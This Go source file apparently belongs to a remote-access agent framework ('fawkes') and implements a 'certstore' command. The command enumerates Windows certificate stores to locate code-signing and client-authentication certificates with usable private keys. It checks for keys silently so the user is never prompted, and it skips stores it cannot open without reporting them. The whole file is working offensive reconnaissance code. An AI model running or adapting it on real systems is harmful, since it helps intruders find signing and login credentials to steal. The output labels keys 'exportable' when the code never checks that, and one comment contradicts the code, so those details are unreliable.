//go:build windows
// +build windows

package commands

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type CertstoreCommand struct{}

func (c *CertstoreCommand) Name() string {
	return "certstore"
}

func (c *CertstoreCommand) Description() string {
	return "Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys"
}

type certstoreParams struct {
	Action string `json:"action"`
	Store  string `json:"store"`
	Filter string `json:"filter"`
}

var (
	crypt32              = windows.NewLazySystemDLL("crypt32.dll")
	procCertOpenStore     = crypt32.NewProc("CertOpenStore")
	procCertCloseStore    = crypt32.NewProc("CertCloseStore")
	procCertEnumCerts     = crypt32.NewProc("CertEnumCertificatesInStore")
	procCertGetNameW      = crypt32.NewProc("CertGetNameStringW")
	procCryptAcquireCert  = crypt32.NewProc("CryptAcquireCertificatePrivateKey")
)

// CERT_STORE_PROV_SYSTEM_W
const (
	certStoreProvSystemW     = 10
	certStoreLocalMachineID  = 0x00020000 // CERT_SYSTEM_STORE_LOCAL_MACHINE
	certStoreCurrentUserID   = 0x00010000 // CERT_SYSTEM_STORE_CURRENT_USER
	certNameSimpleDisplayType = 4
	certNameIssuerFlag        = 1
	cryptAcquireCacheFlag     = 0x00000001
	cryptAcquireSilentFlag    = 0x00000040
)

// CERT_CONTEXT structure
type certContext struct {
	CertEncodingType uint32
	CertEncoded      uintptr
	CertEncodedLen   uint32
	CertInfo         uintptr
	Store            uintptr
}

// CERT_INFO structure (partial — only fields we need)
type certInfo struct {
	Version              uint32
	SerialNumber         cryptIntegerBlob
	SignatureAlgorithm   cryptAlgorithmID
	Issuer               cryptDataBlob
	NotBefore            windows.Filetime
	NotAfter             windows.Filetime
	Subject              cryptDataBlob
	SubjectPublicKeyInfo subjectPublicKeyInfo
}

type cryptIntegerBlob struct {
	Size uint32
	Data uintptr
}

type cryptDataBlob struct {
	Size uint32
	Data uintptr
}

type cryptAlgorithmID struct {
	ObjID      uintptr
	Parameters cryptDataBlob
}

type subjectPublicKeyInfo struct {
	Algorithm cryptAlgorithmID
	PublicKey  cryptBitBlob
}

type cryptBitBlob struct {
	Size       uint32
	Data       uintptr
	UnusedBits uint32
}

type certEntry struct {
	Subject      string
	Issuer       string
	SerialNumber string
	NotBefore    time.Time
	NotAfter     time.Time
	Thumbprint   string
	HasPrivKey   bool
	KeyBits      int
	Store        string
	Location     string
}

func (c *CertstoreCommand) Execute(task structs.Task) structs.CommandResult {
	var params certstoreParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return certstoreList(params.Store, params.Filter)
	case "find":
		return certstoreFind(params.Store, params.Filter)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'list' or 'find')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func certstoreList(store, filter string) structs.CommandResult {
	storesToEnum := getStoreNames(store)
	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	var allCerts []certEntry

	for _, loc := range locations {
		for _, storeName := range storesToEnum {
			certs, err := enumCertsInStore(storeName, loc.flag, loc.name, filter)
			if err != nil {
				// Silently skip stores that can't be opened (permission issues)
				continue
			}
			allCerts = append(allCerts, certs...)
		}
	}

	if len(allCerts) == 0 {
		msg := "No certificates found"
		if filter != "" {
			msg += fmt.Sprintf(" matching '%s'", filter)
		}
		return structs.CommandResult{
			Output:    msg,
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Certificates Found: %d\n\n", len(allCerts)))

	// Group by store
	storeGroups := make(map[string][]certEntry)
	for _, cert := range allCerts {
		key := fmt.Sprintf("%s\\%s", cert.Location, cert.Store)
		storeGroups[key] = append(storeGroups[key], cert)
	}

	for groupName, certs := range storeGroups {
		sb.WriteString(fmt.Sprintf("=== %s (%d) ===\n", groupName, len(certs)))
		for _, cert := range certs {
			sb.WriteString(formatCertEntry(cert))
			sb.WriteString("\n")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func certstoreFind(store, filter string) structs.CommandResult {
	if filter == "" {
		return structs.CommandResult{
			Output:    "Error: filter is required for find action (search by subject, issuer, or thumbprint)",
			Status:    "error",
			Completed: true,
		}
	}
	return certstoreList(store, filter)
}

func getStoreNames(store string) []string {
	if store == "" || strings.EqualFold(store, "all") {
		return []string{"MY", "ROOT", "CA", "Trust", "TrustedPeople"}
	}
	return []string{store}
}

func enumCertsInStore(storeName string, locationFlag uint32, locationName, filter string) ([]certEntry, error) {
	storeNameUTF16, err := windows.UTF16PtrFromString(storeName)
	if err != nil {
		return nil, err
	}

	// CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, 0, flags, storeName)
	storeHandle, _, sysErr := procCertOpenStore.Call(
		certStoreProvSystemW,
		0,
		0,
		uintptr(locationFlag),
		uintptr(unsafe.Pointer(storeNameUTF16)),
	)
	if storeHandle == 0 {
		return nil, fmt.Errorf("CertOpenStore failed: %v", sysErr)
	}
	defer procCertCloseStore.Call(storeHandle, 0)

	var certs []certEntry
	var prevCtx uintptr

	for {
		// CertEnumCertificatesInStore(store, prevCtx)
		ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
		if ctxPtr == 0 {
			break
		}
		prevCtx = ctxPtr

		ctx := (*certContext)(unsafe.Pointer(ctxPtr))
		entry := parseCertContext(ctx, storeName, locationName)

		// Check filter
		if filter != "" {
			lowerFilter := strings.ToLower(filter)
			if !strings.Contains(strings.ToLower(entry.Subject), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.Issuer), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.Thumbprint), lowerFilter) &&
				!strings.Contains(strings.ToLower(entry.SerialNumber), lowerFilter) {
				continue
			}
		}

		// Check for private key
		entry.HasPrivKey = checkPrivateKey(ctxPtr)

		certs = append(certs, entry)
	}

	return certs, nil
}

func parseCertContext(ctx *certContext, storeName, locationName string) certEntry {
	entry := certEntry{
		Store:    storeName,
		Location: locationName,
	}

	// Get subject name
	entry.Subject = getCertName(uintptr(unsafe.Pointer(ctx)), certNameSimpleDisplayType, 0)
	// Get issuer name
	entry.Issuer = getCertName(uintptr(unsafe.Pointer(ctx)), certNameSimpleDisplayType, certNameIssuerFlag)

	// Compute SHA-1 thumbprint from the encoded cert data
	if ctx.CertEncodedLen > 0 && ctx.CertEncoded != 0 {
		certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
		entry.Thumbprint = sha1Thumbprint(certBytes)
	}

	// Parse CERT_INFO for dates and serial number
	if ctx.CertInfo != 0 {
		info := (*certInfo)(unsafe.Pointer(ctx.CertInfo))

		entry.NotBefore = certFiletimeToTime(info.NotBefore)
		entry.NotAfter = certFiletimeToTime(info.NotAfter)

		// Serial number (little-endian byte array)
		if info.SerialNumber.Size > 0 && info.SerialNumber.Data != 0 {
			serialBytes := unsafe.Slice((*byte)(unsafe.Pointer(info.SerialNumber.Data)), info.SerialNumber.Size)
			// Reverse for display (big-endian display convention)
			reversed := make([]byte, len(serialBytes))
			for i, b := range serialBytes {
				reversed[len(serialBytes)-1-i] = b
			}
			entry.SerialNumber = hex.EncodeToString(reversed)
		}

		// Key size from SubjectPublicKeyInfo
		entry.KeyBits = int(info.SubjectPublicKeyInfo.PublicKey.Size) * 8
		if entry.KeyBits <= 0 {
			entry.KeyBits = 0
		}
	}

	return entry
}

func getCertName(certCtxPtr uintptr, nameType, flags uint32) string {
	// First call to get required size
	size, _, _ := procCertGetNameW.Call(
		certCtxPtr,
		uintptr(nameType),
		uintptr(flags),
		0,
		0,
		0,
	)
	if size <= 1 {
		return ""
	}

	buf := make([]uint16, size)
	procCertGetNameW.Call(
		certCtxPtr,
		uintptr(nameType),
		uintptr(flags),
		0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
	)

	return windows.UTF16ToString(buf)
}

func checkPrivateKey(certCtxPtr uintptr) bool {
	var keyProv uintptr
	var keySpec uint32
	var callerFree int32

	// CryptAcquireCertificatePrivateKey(pCert, dwFlags, pvParameters, phCryptProv, pdwKeySpec, pfCallerFree)
	// CRYPT_ACQUIRE_CACHE_FLAG | CRYPT_ACQUIRE_SILENT_FLAG — don't prompt user
	r1, _, _ := procCryptAcquireCert.Call(
		certCtxPtr,
		uintptr(cryptAcquireCacheFlag|cryptAcquireSilentFlag),
		0,
		uintptr(unsafe.Pointer(&keyProv)),
		uintptr(unsafe.Pointer(&keySpec)),
		uintptr(unsafe.Pointer(&callerFree)),
	)

	return r1 != 0
}

// sha1Thumbprint computes SHA-1 hash manually (no crypto import needed)
func sha1Thumbprint(data []byte) string {
	// Use CryptHashCertificate from crypt32.dll
	var hashSize uint32 = 20
	hash := make([]byte, 20)

	procCryptHashCert := crypt32.NewProc("CryptHashCertificate")
	r1, _, _ := procCryptHashCert.Call(
		0,
		0x00008004, // CALG_SHA1
		0,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&hash[0])),
		uintptr(unsafe.Pointer(&hashSize)),
	)
	if r1 == 0 {
		return ""
	}

	// Format as hex with colons
	parts := make([]string, hashSize)
	for i := uint32(0); i < hashSize; i++ {
		parts[i] = fmt.Sprintf("%02X", hash[i])
	}
	return strings.Join(parts, ":")
}

func certFiletimeToTime(ft windows.Filetime) time.Time {
	// Convert FILETIME (100ns intervals since 1601-01-01) to time.Time
	nsec := int64(ft.HighDateTime)<<32 | int64(ft.LowDateTime)
	if nsec == 0 {
		return time.Time{}
	}
	// Windows epoch to Unix epoch: 11644473600 seconds
	const epochDiff = 116444736000000000
	unixNsec := (nsec - epochDiff) * 100
	return time.Unix(0, unixNsec).UTC()
}

func formatCertEntry(cert certEntry) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("  Subject:   %s\n", cert.Subject))
	sb.WriteString(fmt.Sprintf("  Issuer:    %s\n", cert.Issuer))

	if cert.SerialNumber != "" {
		sb.WriteString(fmt.Sprintf("  Serial:    %s\n", cert.SerialNumber))
	}

	if !cert.NotBefore.IsZero() {
		sb.WriteString(fmt.Sprintf("  Valid:     %s → %s", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02")))
		if cert.NotAfter.Before(time.Now()) {
			sb.WriteString(" [EXPIRED]")
		}
		sb.WriteString("\n")
	}

	sb.WriteString(fmt.Sprintf("  Thumbprint: %s\n", cert.Thumbprint))

	if cert.HasPrivKey {
		sb.WriteString("  Private Key: YES (exportable key available)\n")
	}

	// Classify the certificate
	if cert.HasPrivKey {
		isSelfSigned := cert.Subject == cert.Issuer
		if isSelfSigned {
			sb.WriteString("  Type:      Self-signed (private key available)\n")
		} else {
			sb.WriteString("  Type:      Certificate with private key\n")
		}
	}

	return sb.String()
}
